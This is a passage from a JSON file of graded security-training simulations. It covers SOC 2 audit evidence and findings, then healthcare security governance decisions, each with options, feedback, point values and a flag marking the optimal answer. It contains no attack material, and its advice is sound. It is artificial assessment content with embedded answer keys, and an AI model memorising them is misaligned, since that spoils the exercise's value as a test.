            "feedback": "Creating backdated evidence is fraud. Auditors are trained to detect fabricated evidence. If evidence doesn't exist, be honest - it's a finding, not a crime. Fabricating evidence is both unethical and likely to be discovered, resulting in much worse consequences.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Never fabricate evidence. Missing evidence is a finding; fabricated evidence is fraud.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "Implement continuous evidence collection process: automated where possible, systematic collection schedule, central repository",
            "feedback": "Correct! Evidence should be collected continuously as controls operate, not gathered before audits. Automate collection where possible (system logs, access exports). Schedule manual collection (review documentation). Store centrally for easy retrieval. This prevents scrambles.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Evidence collection should be continuous and systematic. Automation and central storage prevent audit scrambles.",
            "consequences": {
              "immediate": "Systematic evidence management established",
              "security_impact": "Control operation verified continuously",
              "business_impact": "Audit preparation becomes routine, not crisis"
            }
          },
          {
            "id": "c",
            "text": "Hire a consultant to gather evidence before each audit",
            "feedback": "Consultants can help but evidence must be collected as controls operate. You can't gather evidence of a quarterly access review that didn't happen. Consultants can organize existing evidence, but control owners must generate it during normal operations.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Evidence is generated by control operation. Consultants can help organize but can't create evidence that doesn't exist.",
            "consequences": {}
          },
          {
            "id": "d",
            "text": "Tell the auditor we're a startup and formal evidence isn't realistic for our size",
            "feedback": "Auditors assess against standards, not company size. If you want SOC 2, you need evidence. 'We're small' doesn't excuse lack of controls. You can scale processes to size, but documentation of control operation is required regardless of company size.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Audit requirements apply regardless of company size. Scale processes appropriately but still maintain evidence.",
            "consequences": {}
          }
        ],
        "hints": [
          "When should evidence be collected - during audits or during normal operations?",
          "What makes evidence credible to an auditor?"
        ]
      },
      {
        "id": "dp4",
        "sequence": 4,
        "title": "Handling Audit Findings",
        "situation": "The SOC 2 audit is complete. The auditor presents findings:\n\n**Control Exception:** 2 of 25 sampled changes lacked documented approval before implementation\n**Control Deviation:** Access reviews were performed quarterly instead of monthly as stated in policy\n\nThe auditor says these will be noted in the report. Your CEO asks: 'Is this bad? Can we get them removed?'",
        "options": [
          {
            "id": "a",
            "text": "Argue with the auditor to remove findings; they'll hurt our reputation",
            "feedback": "Arguing to remove legitimate findings damages credibility and is usually unsuccessful. Auditors must report what they find. If findings are factually accurate, the appropriate response is to acknowledge and remediate, not argue for removal.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Don't argue to remove legitimate findings. Accept accurate findings and focus on remediation.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "Accept findings, provide management response explaining root cause and remediation plan",
            "feedback": "Correct! Findings in SOC 2 reports are common and manageable. Provide a thoughtful management response: acknowledge the issue, explain what happened (root cause), describe corrective action, and commit to timeline. Customers understand that no organization is perfect.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Audit findings are opportunities for improvement. Professional management response demonstrates maturity.",
            "consequences": {
              "immediate": "Professional response to audit findings",
              "security_impact": "Root causes identified and addressed",
              "business_impact": "Demonstrates mature handling of findings"
            }
          },
          {
            "id": "c",
            "text": "These findings will make the report worthless; don't release it to customers",
            "feedback": "Minor findings don't invalidate the report. Most SOC 2 reports have some exceptions or deviations. Customers understand this. Not releasing the report is worse - it looks like you're hiding something. Transparency with explanation is better than avoidance.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Some findings are normal. Transparency about findings with remediation is better than hiding reports.",
            "consequences": {}
          },
          {
            "id": "d",
            "text": "Change the policy to match what actually happens (quarterly instead of monthly reviews)",
            "feedback": "Changing policy to match deviation addresses the finding but may weaken security. Evaluate whether monthly reviews are actually needed. If yes, fix the process. If quarterly is sufficient, then update the policy. But don't weaken controls just to eliminate findings.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Policy changes should be based on security needs, not just to eliminate audit findings.",
            "consequences": {}
          }
        ],
        "hints": [
          "What do customers reviewing the report actually care about?",
          "How do mature organizations handle audit findings?"
        ]
      },
      {
        "id": "dp5",
        "sequence": 5,
        "title": "Continuous Compliance",
        "situation": "After your first SOC 2 report, the CEO asks: 'Do we have to do this every year? Can't we just reuse this report?'\n\nHow do you explain ongoing compliance?",
        "options": [
          {
            "id": "a",
            "text": "Yes, we can use this report for several years; SOC 2 is a one-time certification",
            "feedback": "SOC 2 reports have a defined period and become stale. Type II reports cover a specific period (e.g., Jan 1 - Dec 31, 2024). After that period, the report doesn't represent current state. Customers expect recent reports, typically within 12 months.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "SOC 2 reports are period-specific, not permanent certifications. Annual reports are expected.",
            "consequences": {}
          },
          {
            "id": "b",
            "text": "SOC 2 requires annual reports; compliance is ongoing, not one-time",
            "feedback": "Correct! SOC 2 reports cover a specific period and need to be renewed. Customers expect recent reports - typically within 12 months. Compliance is continuous: maintain controls, collect evidence throughout the year, and get annual attestation. This demonstrates sustained commitment.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Compliance is ongoing, not one-time. SOC 2 reports are period-specific and need annual renewal.",
            "consequences": {
              "immediate": "Proper expectations for ongoing compliance",
              "security_impact": "Sustained control operation",
              "business_impact": "Customers receive current assurance"
            }
          },
          {
            "id": "c",
            "text": "We only need another audit if customers specifically ask for it",
            "feedback": "Waiting for customers to ask creates gaps. When a customer asks for a current report and you don't have one, you may lose the deal. Proactive annual audits ensure you always have current report ready. Compliance should be proactive, not reactive.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Maintain current compliance proactively. Don't wait for customer requests to reveal gaps.",
            "consequences": {}
          },
          {
            "id": "d",
            "text": "We can skip years where nothing changed; only audit when we make changes",
            "feedback": "Audits verify that controls operated, not just that they exist. Even without changes, you need to demonstrate controls operated throughout the period. Access reviews happened, backups ran, training was completed. 'Nothing changed' doesn't mean compliance evidence exists.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Audits verify control operation, which happens regardless of changes. Evidence must cover each period.",
            "consequences": {}
          }
        ],
        "hints": [
          "What does the report period mean for its validity?",
          "What do customers expect when they ask for compliance evidence?"
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 125,
    "passing_score": 75
  },
  {
    "id": "D5-SIM-001",
    "title": "Security Governance and Policy Development",
    "domain": 5,
    "type": "SIM",
    "difficulty": "intermediate",
    "time_estimate": 50,
    "role": "Security Policy Manager",
    "organization": {
      "name": "Meridian Healthcare Systems",
      "industry": "Healthcare",
      "size": "Regional hospital network with 12 facilities, 8,500 employees",
      "environment": "HIPAA-regulated environment with electronic health records (EHR), medical devices, telehealth platforms, and research data. Recent expansion through acquisition of three smaller clinics.",
      "current_state": "Security policies are fragmented across legacy organizations. Some facilities follow outdated procedures, others have no documented policies. Recent Joint Commission audit flagged inconsistent security practices as a compliance concern."
    },
    "introduction": "You've been hired as Security Policy Manager at Meridian Healthcare Systems to establish a unified security governance framework. The organization has grown through acquisition, leaving a patchwork of security policies, procedures, and practices. Leadership wants a cohesive program that satisfies regulatory requirements, supports clinical operations, and establishes clear accountability. You'll develop the governance structure, create foundational policies, and implement a sustainable policy lifecycle.",
    "learning_objectives": [
      "Understand the hierarchy of governance documents (policies, standards, procedures, guidelines)",
      "Design governance structures with appropriate roles and responsibilities",
      "Develop policies that balance security requirements with operational needs",
      "Navigate regulatory and external considerations in policy development",
      "Implement effective policy lifecycle management"
    ],
    "decision_points": [
      {
        "id": "dp1",
        "sequence": 1,
        "title": "Governance Document Assessment",
        "situation": "Your initial assessment reveals significant documentation gaps. You've inventoried what exists:\n\n**Legacy Meridian (main hospital):**\n- Acceptable Use Policy (last updated 2019)\n- Password Policy (last updated 2021)\n- Incident Response Plan (undated)\n\n**Acquired Clinic Network:**\n- Information Security Policy (2022, comprehensive but different approach)\n- HIPAA Privacy Policy (current)\n- No technical standards or procedures documented\n\n**Recently Acquired Research Clinic:**\n- Research Data Policy (current, but narrow scope)\n- No general security documentation\n\nLeadership asks you to prioritize. What's your first governance priority?",
        "options": [
          {
            "id": "a",
            "text": "Update all existing policies to current standards immediately",
            "feedback": "Updating existing policies without a unified framework creates more fragmentation. You'd be patching a broken structure rather than building a solid foundation. The policies would still lack coherence and may conflict with each other.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Policy updates should follow establishment of a governance framework, not precede it.",
            "consequences": {
              "immediate": "Staff receives updated but inconsistent policies",
              "security_impact": "Confusion continues as policies don't align",
              "business_impact": "Audit findings persist due to lack of unified framework"
            }
          },
          {
            "id": "b",
            "text": "Create a master Information Security Policy establishing governance framework first",
            "feedback": "Excellent approach. A master Information Security Policy establishes the foundation: governance structure, roles and responsibilities, policy hierarchy, and principles that all other documents will follow. This creates coherence before detailed policies are developed.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "The master security policy (sometimes called 'Information Security Program Charter') establishes the foundation that all other policies, standards, and procedures build upon.",
            "consequences": {
              "immediate": "Clear framework guides all subsequent policy development",
              "security_impact": "Consistent security approach across all facilities",
              "business_impact": "Demonstrates governance maturity to auditors and regulators"
            }
          },
          {
            "id": "c",
            "text": "Adopt the acquired clinic network's comprehensive policy as the organization standard",
            "feedback": "While expedient, adopting one facility's policy ignores the specific needs of hospital operations, research requirements, and the existing culture at other facilities. Imposed policies face resistance and may not address all regulatory requirements across different care settings.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Governance documents should be developed with stakeholder input and tailored to organizational context, not simply adopted from elsewhere.",
            "consequences": {
              "immediate": "Quick policy deployment but poor fit for many operations",
              "security_impact": "Gaps in coverage for hospital and research-specific requirements",
              "business_impact": "Resistance from staff whose input wasn't considered"
            }
          },
          {
            "id": "d",
            "text": "Focus on HIPAA compliance documentation since it's the primary regulatory requirement",
            "feedback": "HIPAA is important but represents only one aspect of security governance. Focusing solely on compliance creates a checkbox mentality and misses broader security needs. A comprehensive governance framework naturally incorporates compliance requirements.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Compliance-driven security is reactive and narrow. Risk-based governance addresses compliance as one component of comprehensive security.",
            "consequences": {
              "immediate": "HIPAA documentation improves",
              "security_impact": "Non-HIPAA security gaps remain unaddressed",
              "business_impact": "False sense of security; other risks unmanaged"
            }
          }
        ],
        "hints": [
          "Think about building a house - what needs to be in place before you can install windows and doors?",
          "Consider which approach creates consistency versus which perpetuates fragmentation"
        ]
      },
      {
        "id": "dp2",
        "sequence": 2,
        "title": "Governance Structure Design",
        "situation": "With approval to develop a master Information Security Policy, you need to define the governance structure. The CISO reports to the CFO currently. You're designing committees and roles that will provide oversight and decision-making authority.\n\nThe CEO has asked: 'Who should ultimately be accountable for information security, and what committees do we need?'\n\nWhich governance structure do you recommend?",
        "options": [
          {
            "id": "a",
            "text": "Security decisions made by IT department with CISO having final authority on all security matters",
            "feedback": "Concentrating all authority in IT/CISO creates silos and misses business context. Security decisions often have operational, legal, financial, and clinical implications that require broader input. This structure also creates a single point of failure for decision-making.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security governance requires input from multiple stakeholders. IT-centric governance misses business context and creates resistance.",
            "consequences": {
              "immediate": "Quick decisions but limited business perspective",
              "security_impact": "Security decisions may not align with business priorities",
              "business_impact": "Clinical and business leaders feel excluded; compliance may be impacted"
            }
          },
          {
            "id": "b",
            "text": "Executive Security Steering Committee with Board reporting, supported by operational Security Working Group",
            "feedback": "Excellent structure. The Executive Steering Committee (C-suite, including CISO, CMO, COO, General Counsel) provides strategic oversight and policy approval with board visibility. The Security Working Group (technical and operational leads) handles implementation and day-to-day decisions. This provides appropriate authority levels and business alignment.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Effective governance uses tiered structure: Board oversight \u00e2\u2020\u2019 Executive steering committee \u00e2\u2020\u2019 Operational working groups. This ensures strategic alignment and appropriate authority.",
            "consequences": {
              "immediate": "Clear decision-making authority at appropriate levels",
              "security_impact": "Security decisions informed by clinical and business needs",
              "business_impact": "Executive buy-in and board-level visibility demonstrates governance maturity"
            }
          },
          {
            "id": "c",
            "text": "Compliance Committee handles security governance since HIPAA is the primary driver",
            "feedback": "Folding security governance under compliance conflates two related but distinct functions. Compliance focuses on meeting regulatory requirements; security governance addresses broader risk management and strategic security decisions. This limits security to a compliance checkbox exercise.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "While security and compliance are related, effective governance treats security as a business function with compliance as one input, not the sole driver.",
            "consequences": {
              "immediate": "Security seen as compliance function only",
              "security_impact": "Risk-based decisions subordinated to compliance focus",
              "business_impact": "Security investment difficult to justify beyond compliance minimums"
            }
          },
          {
            "id": "d",
            "text": "Each facility maintains its own security governance with coordination meetings quarterly",
            "feedback": "Decentralized governance perpetuates the current fragmentation problem. While local input is valuable, an organization needs unified governance for consistency, efficiency, and clear accountability. Quarterly coordination is too infrequent for effective security management.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Unified governance doesn't mean ignoring local needs - it means consistent framework with appropriate local implementation flexibility.",
            "consequences": {
              "immediate": "Minimal change from current fragmented state",
              "security_impact": "Inconsistent security posture continues",
              "business_impact": "Audit findings persist; inefficient duplication of effort"
            }
          }
        ],
        "hints": [
          "Consider what decisions need executive authority versus operational authority",
          "Think about how security connects to clinical care, legal, finance, and operations"
        ]
      },
      {
        "id": "dp3",
        "sequence": 3,
        "title": "Policy Development Approach",
        "situation": "The Executive Steering Committee has approved your governance structure. Now you need to develop the actual policies. You've identified 15 policies needed for comprehensive coverage.\n\nThe CMO raises a concern: 'The last time IT rolled out a new policy, clinical staff ignored it because it interfered with patient care. How will these be different?'\n\nHow do you approach policy development to ensure both security effectiveness and clinical adoption?",
        "options": [
          {
            "id": "a",
            "text": "Develop policies based on security best practices and mandate compliance through HR disciplinary process",
            "feedback": "Mandate-only approaches create adversarial relationships and shadow IT. Clinical staff will find workarounds that may be less secure than managed alternatives. Policies developed without operational input often contain impractical requirements.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Effective policies require both authority (enforcement capability) and legitimacy (stakeholder acceptance). Mandate without input achieves neither.",
            "consequences": {
              "immediate": "Policies published but widely circumvented",
              "security_impact": "Shadow IT and workarounds create unknown risks",
              "business_impact": "Clinical staff resentment; security seen as obstacle"
            }
          },
          {
            "id": "b",
            "text": "Let clinical departments write their own policies to ensure operational fit",
            "feedback": "Delegating policy writing to departments creates inconsistency and may miss security requirements. Clinical experts know workflows but may not understand threat landscape or compliance requirements. Policies need security expertise with clinical input, not the reverse.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Policy development requires security expertise. Stakeholder input shapes implementation, not security requirements themselves.",
            "consequences": {
              "immediate": "Policies fit clinical workflows but miss security requirements",
              "security_impact": "Critical controls may be omitted or weakened",
              "business_impact": "Compliance gaps discovered in audits"
            }
          },
          {
            "id": "c",
            "text": "Security drafts policies with clinical stakeholder review, pilot testing, and iterative refinement before rollout",
            "feedback": "Excellent approach. Security expertise ensures requirements are correct while clinical review ensures operational feasibility. Pilot testing reveals practical issues before organization-wide rollout. Iterative refinement builds policies that are both secure and workable.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "The policy development cycle should include: Draft \u00e2\u2020\u2019 Stakeholder review \u00e2\u2020\u2019 Revision \u00e2\u2020\u2019 Pilot \u00e2\u2020\u2019 Refinement \u00e2\u2020\u2019 Approval \u00e2\u2020\u2019 Rollout \u00e2\u2020\u2019 Feedback \u00e2\u2020\u2019 Maintenance.",
            "consequences": {
              "immediate": "Longer development cycle but higher quality policies",
              "security_impact": "Policies address real risks in operationally feasible ways",
              "business_impact": "Clinical buy-in; staff see their input reflected"
            }
          },
          {
            "id": "d",
            "text": "Adopt industry-standard policy templates to save time and ensure completeness",
            "feedback": "Templates provide useful starting points but require significant customization. Generic policies don't reflect organizational context, specific systems, or operational workflows. Template policies often read as foreign documents that staff don't recognize as relevant to their work.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Templates can inform policy development but should never be adopted verbatim. Effective policies reflect organizational context and culture.",
            "consequences": {
              "immediate": "Quick policy publication but poor organizational fit",
              "security_impact": "Generic controls may miss specific risks or be impractical",
              "business_impact": "Staff sees policies as irrelevant bureaucracy"
            }
          }
        ],
        "hints": [
          "Consider the CMO's concern - what caused staff to ignore the previous policy?",
          "Think about how to get both security effectiveness AND user adoption"
        ]
      },
      {
        "id": "dp4",
        "sequence": 4,
        "title": "Handling External Considerations",
        "situation": "As you develop the Access Control Policy, you encounter multiple external considerations that must be addressed:\n\n1. **HIPAA Security Rule** requires access controls with unique user IDs and automatic logoff\n2. **Joint Commission** standards require timely access to patient information for care delivery\n3. **State Law** requires specific breach notification procedures and has stricter requirements than HIPAA\n4. **Medical Staff Bylaws** grant physicians certain privileges that conflict with least privilege principles\n5. **Insurance Requirements** mandate specific controls for cyber liability coverage\n\nThese requirements sometimes conflict. The General Counsel asks: 'How do we handle situations where requirements don't align?'\n\nWhat approach do you recommend?",
        "options": [
          {
            "id": "a",
            "text": "Follow the most restrictive requirement in all cases to ensure compliance with everything",
            "feedback": "While conceptually simple, 'most restrictive' isn't always feasible or appropriate. Some requirements conflict in ways where being more restrictive on one dimension violates another requirement. This approach also ignores operational feasibility and may prevent legitimate business functions.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "The 'most restrictive' heuristic is a useful starting point but requires analysis of specific conflicts and operational impact.",
            "consequences": {
              "immediate": "Policies may be overly restrictive and operationally problematic",
              "security_impact": "May actually reduce security by encouraging workarounds",
              "business_impact": "Clinical care may be impacted; physician resistance"
            }
          },
          {
            "id": "b",
            "text": "Create a requirements matrix, identify conflicts, and resolve through risk-based decisions documented with legal review",
            "feedback": "Excellent approach. Mapping all requirements in a matrix reveals where they align and conflict. Risk-based resolution with legal input ensures decisions consider compliance implications. Documentation provides audit trail and rationale for decisions.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "External considerations must be systematically analyzed. A requirements matrix with documented conflict resolution demonstrates governance maturity.",
            "consequences": {
              "immediate": "Clear understanding of all requirements and conflicts",
              "security_impact": "Thoughtful balance of security and operational needs",
              "business_impact": "Defensible decisions with documented rationale"
            }
          },
          {
            "id": "c",
            "text": "HIPAA takes precedence as the primary healthcare regulation; other requirements are secondary",
            "feedback": "HIPAA is important but doesn't automatically supersede other requirements. State laws may have stricter requirements that still apply. Joint Commission affects accreditation. Insurance requirements affect coverage. Prioritizing one requirement above all others creates compliance gaps.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Healthcare organizations face multiple overlapping regulatory frameworks. Effective governance addresses all applicable requirements, not just the most prominent one.",
            "consequences": {
              "immediate": "HIPAA compliance achieved but other gaps remain",
              "security_impact": "May miss stricter state requirements",
              "business_impact": "Potential Joint Commission findings; insurance coverage questions"
            }
          },
          {
            "id": "d",
            "text": "Defer to Legal on all external requirement interpretations; security implements what Legal approves",
            "feedback": "Legal expertise is essential for compliance interpretation, but they shouldn't make all decisions. Legal may not understand technical security implications or operational feasibility. This creates bottlenecks and may result in legally compliant but operationally unworkable policies.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Legal is a critical stakeholder and advisor, but security governance requires collaboration across legal, security, operations, and clinical leadership.",
            "consequences": {
              "immediate": "Slow policy development waiting for legal review",
              "security_impact": "Security considerations may be subordinated to legal interpretation",
              "business_impact": "Legal bottleneck delays program maturity"
            }
          }
        ],
        "hints": [
          "How do you handle situations where you can't simply pick the 'strictest' option?",
          "Think about documentation and defensibility of decisions"
        ]
      },
      {
        "id": "dp5",
        "sequence": 5,
        "title": "Data Governance Integration",
        "situation": "The Research VP approaches you with a challenge. The research clinic conducts clinical trials that involve:\n- Protected Health Information (PHI) from patient participants\n- Genomic data with special sensitivity considerations\n- Data shared with academic partners under Data Use Agreements\n- Data that could be commercialized for future value\n\nShe asks: 'We need a data classification policy, but the generic 'Public/Internal/Confidential/Restricted' model doesn't capture the nuances of our research data. How should we handle this?'\n\nHow do you approach data classification for this complex environment?",
        "options": [
          {
            "id": "a",
            "text": "Use the standard four-tier classification model; research data falls under 'Restricted'",
            "feedback": "Generic classification models don't capture important distinctions in how data can be used. Lumping all sensitive research data as 'Restricted' doesn't differentiate between data that can be shared with partners, data that's truly internal-only, and data with commercialization potential.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Classification schemes should reflect how data actually needs to be protected and used, not just abstract sensitivity levels.",
            "consequences": {
              "immediate": "Simple model but poor fit for research needs",
              "security_impact": "Over-classification restricts legitimate research; under-protection of most sensitive data",
              "business_impact": "Research collaboration impeded; commercial opportunities unclear"
            }
          },
          {
            "id": "b",
            "text": "Create a separate classification scheme for research data independent of clinical data classification",
            "feedback": "Parallel classification schemes create confusion and inconsistency. Staff working with both clinical and research data would need to learn two systems. Integration between systems becomes complicated when data flows between contexts.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Organizations should have unified data governance with flexibility for different data types, not parallel governance systems.",
            "consequences": {
              "immediate": "Research-specific scheme but organizational fragmentation",
              "security_impact": "Gaps where clinical and research data intersect",
              "business_impact": "Confusion; training burden; audit complexity"
            }
          },
          {
            "id": "c",
            "text": "Develop unified classification framework with base tiers plus data-specific handling tags that address regulatory, sharing, and commercialization requirements",
            "feedback": "Excellent approach. Base classification tiers provide consistency while handling tags capture specific requirements. This allows 'Restricted + PHI + Research-Shareable' to be distinguished from 'Restricted + PHI + Internal-Only'. Tags enable nuanced handling without creating classification sprawl.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Modern data classification often uses base tiers combined with handling tags for regulatory requirements (PHI, PCI), sharing permissions, retention requirements, and other attributes.",
            "consequences": {
              "immediate": "Comprehensive framework addressing all data types",
              "security_impact": "Appropriate controls for each data type and use case",
              "business_impact": "Research collaboration enabled with clear boundaries"
            }
          },
          {
            "id": "d",
            "text": "Let the Research VP define classification for research data since she understands it best",
            "feedback": "Data owners should define classification for their data, but within a framework established by security governance. Delegating framework design to one data owner creates inconsistency and may miss security requirements the data owner doesn't fully understand.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Data owners classify their data within an organization-wide framework; they don't design the framework itself.",
            "consequences": {
              "immediate": "Research-friendly scheme but governance fragmentation",
              "security_impact": "Security requirements may be missed",
              "business_impact": "Precedent for each department defining own classification"
            }
          }
        ],
        "hints": [
          "Think about what information the classification needs to convey - sensitivity alone?",
          "Consider how data might need different handling even at the same sensitivity level"
        ]
      },
      {
        "id": "dp6",
        "sequence": 6,
        "title": "Exception Management",
        "situation": "Your new Endpoint Security Policy requires all systems to run approved endpoint protection software with current signatures. However, you've received exception requests:\n\n1. **Medical Device Team**: 'Our MRI machines and patient monitors run embedded systems that can't support endpoint agents. Installing unauthorized software voids FDA clearance.'\n\n2. **Research Lab**: 'Our genomics sequencing workstations run specialized Linux distributions. Endpoint agents cause performance degradation that ruins time-sensitive experiments.'\n\n3. **Executive Assistant**: 'The CEO's laptop is too slow with the endpoint agent running. She needs it removed.'\n\nHow do you handle these exception requests?",
        "options": [
          {
            "id": "a",
            "text": "Deny all exceptions; policies must apply equally to everyone for security",
            "feedback": "Zero-exception policies sound principled but ignore legitimate operational constraints. Medical device FDA requirements and scientific equipment performance are real constraints. Rigid policies lead to shadow IT and workarounds that create worse security outcomes.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Effective policies include exception processes. The goal is managed risk, not theoretical compliance.",
            "consequences": {
              "immediate": "Conflict with medical device team and research; executive pressure",
              "security_impact": "May force teams to hide non-compliant systems rather than manage them",
              "business_impact": "FDA compliance issues; research productivity impact; executive conflict"
            }
          },
          {
            "id": "b",
            "text": "Grant all exceptions with documentation to avoid operational conflict",
            "feedback": "Granting all exceptions undermines policy authority and creates security gaps. The CEO convenience request doesn't represent a legitimate exception - it's preference over security. Exception processes should evaluate merit, not just avoid conflict.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Exceptions should be granted based on legitimate constraints and compensating controls, not organizational politics or convenience.",
            "consequences": {
              "immediate": "No conflict but significant policy erosion",
              "security_impact": "Growing number of unprotected systems; precedent for convenience exceptions",
              "business_impact": "Policy becomes suggestions; audit findings"
            }
          },
          {
            "id": "c",
            "text": "Evaluate each request: approve legitimate operational needs with compensating controls; deny convenience requests",
            "feedback": "Excellent approach. Medical devices and specialized research equipment have legitimate constraints requiring different controls. CEO laptop performance is not a legitimate exception - modern endpoint agents have minimal impact, and executive devices are high-value targets requiring protection. Each approved exception gets documented compensating controls.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Exception management requires evaluating legitimacy of constraints, identifying compensating controls, documenting risk acceptance, and applying consistent criteria regardless of requester's position.",
            "consequences": {
              "immediate": "Appropriate exceptions granted; convenience request professionally declined",
              "security_impact": "Legitimate exceptions have compensating controls; high-risk systems protected",
              "business_impact": "Demonstrates mature risk-based decision making"
            }
          },
          {
            "id": "d",
            "text": "Escalate all exception requests to the Executive Steering Committee for decision",
            "feedback": "While executive involvement is appropriate for significant exceptions, sending all three to the steering committee wastes executive time and delays operational decisions. The exception process should have authority levels - routine exceptions handled operationally, significant exceptions escalated.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Exception processes should have tiered approval authority. Low-risk exceptions approved operationally; high-risk exceptions require executive approval.",
            "consequences": {
              "immediate": "Slow exception decisions; executive meeting backlog",
              "security_impact": "Delayed decisions leave systems in uncertain state",
              "business_impact": "Executive frustration with operational details"
            }
          }
        ],
        "hints": [
          "Not all exception requests are equally valid - what distinguishes them?",
          "Consider what compensating controls might address legitimate exceptions"
        ]
      },
      {
        "id": "dp7",
        "sequence": 7,
        "title": "Policy Communication and Training",
        "situation": "Your first set of policies is ready for rollout:\n- Information Security Policy (master policy)\n- Acceptable Use Policy (updated and expanded)\n- Access Control Policy (new)\n- Data Classification Policy (new)\n\nThe COO asks: 'We've published policies before that no one read. How do we make sure people actually understand and follow these?'\n\nHow do you approach policy communication and training?",
        "options": [
          {
            "id": "a",
            "text": "Email policies to all staff with acknowledgment requirement; annual quiz for compliance",
            "feedback": "Email distribution with forced acknowledgment is necessary but insufficient. Staff click through without reading. Annual quizzes become memorization exercises disconnected from actual behavior. This checks compliance boxes but doesn't change behavior.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Policy acknowledgment demonstrates notification but not understanding or behavior change. Effective security awareness requires multiple approaches.",
            "consequences": {
              "immediate": "High acknowledgment rate; low actual awareness",
              "security_impact": "Policies exist on paper but behavior unchanged",
              "business_impact": "Compliance evidence but actual risk persists"
            }
          },
          {
            "id": "b",
            "text": "Multi-channel approach: targeted training by role, department champions, practical examples, and ongoing reinforcement",
            "feedback": "Excellent approach. Different roles need different training focus. Department champions provide peer support and local expertise. Practical examples make abstract policies concrete. Ongoing reinforcement maintains awareness beyond initial rollout. This builds actual understanding and behavior change.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Effective policy communication uses multiple channels, tailors content to audience, provides practical guidance, and reinforces over time.",
            "consequences": {
              "immediate": "More effort but genuine understanding",
              "security_impact": "Staff know what's expected and why",
              "business_impact": "Fewer violations; security seen as enabler"
            }
          },
          {
            "id": "c",
            "text": "Manager-led training where each manager explains policies to their team",
            "feedback": "Manager involvement is valuable but managers may not understand security policies well enough to explain them accurately. Without training the trainers, this creates inconsistent messages and potential misunderstandings. Managers should reinforce policies, not be the primary educators.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Managers should reinforce and support security awareness, but core training should come from security professionals who can accurately convey requirements.",
            "consequences": {
              "immediate": "Inconsistent understanding across departments",
              "security_impact": "Misinterpretation of requirements",
              "business_impact": "Manager time burden; potential for misinformation"
            }
          },
          {
            "id": "d",
            "text": "Detailed policy manual with comprehensive guidance on every situation",
            "feedback": "Comprehensive documentation is valuable but won't be read. Staff need digestible, relevant information, not encyclopedic references. Thick policy manuals become shelfware. Documentation should exist for reference but isn't an effective training method.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Policy documentation and policy training are different things. Documentation is reference material; training is active learning.",
            "consequences": {
              "immediate": "Thorough documentation that no one reads",
              "security_impact": "Staff don't know what's expected",
              "business_impact": "Wasted documentation effort"
            }
          }
        ],
        "hints": [
          "Think about what actually changes behavior versus what creates paper compliance",
          "Consider how different roles interact with security policies differently"
        ]
      },
      {
        "id": "dp8",
        "sequence": 8,
        "title": "Measuring Governance Effectiveness",
        "situation": "Six months into your governance program, the Board's Audit Committee asks: 'How do we know if our security governance is actually working? What should we be measuring?'\n\nThe CISO needs your help preparing metrics that demonstrate governance effectiveness without overwhelming the Board with technical details.\n\nWhat metrics framework do you recommend?",
        "options": [
          {
            "id": "a",
            "text": "Technical security metrics: vulnerabilities patched, incidents detected, systems monitored",
            "feedback": "Technical metrics measure security operations, not governance effectiveness. The Board needs to understand whether governance structures are making good decisions and whether policies are being followed - not operational details they lack context to interpret.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Different audiences need different metrics. Technical metrics are for security operations; governance metrics are for leadership.",
            "consequences": {
              "immediate": "Board confused by technical details",
              "security_impact": "Governance issues not measured or addressed",
              "business_impact": "Lost opportunity to demonstrate governance value"
            }
          },
          {
            "id": "b",
            "text": "Compliance metrics: audit findings, policy violations, regulatory correspondence",
            "feedback": "Compliance metrics are part of governance but not the whole picture. They measure whether rules are followed but not whether the rules are right, whether risks are managed, or whether security decisions support business objectives. Pure compliance focus creates checkbox mentality.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Compliance is an outcome of good governance, not a measure of governance effectiveness itself.",
            "consequences": {
              "immediate": "Board sees compliance status but not governance health",
              "security_impact": "Risk-based decisions not measured",
              "business_impact": "Security seen only as compliance cost"
            }
          },
          {
            "id": "c",
            "text": "Balanced scorecard: governance process health, risk posture indicators, compliance status, and program maturity",
            "feedback": "Excellent approach. A balanced scorecard covers multiple dimensions: Are governance processes working? Is risk posture improving? Are we compliant? Is the program maturing? This gives the Board meaningful insight without technical overwhelm and connects security to business objectives.",
            "is_optimal": true,
            "points": 25,
